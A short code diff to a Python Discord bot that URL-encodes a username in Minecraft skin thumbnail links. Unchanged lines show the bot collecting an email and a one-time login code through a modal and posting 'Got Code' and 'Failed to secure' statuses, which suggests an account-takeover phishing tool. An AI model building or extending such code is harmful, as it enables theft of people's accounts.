@@ -3,6 +3,7 @@ import datetime
 import discord
 import httpx
 import json
+from urllib.parse import quote
 
 from views.buttons.embedOptions import ButtonOptions
 from views.buttons.accountInfo import accountInfo
@@ -31,7 +32,7 @@ class MyModalTwo(ui.Modal):
             description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
-        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}")
+        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{quote(self.username, safe='')}")
 
         await interaction.response.defer(ephemeral=True)
 
@@ -54,7 +55,7 @@ class MyModalTwo(ui.Modal):
                     description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C                  
-                ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
+                ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{quote(self.username, safe='')}"),
                 view = ButtonOptions(interaction.user)
             )
 
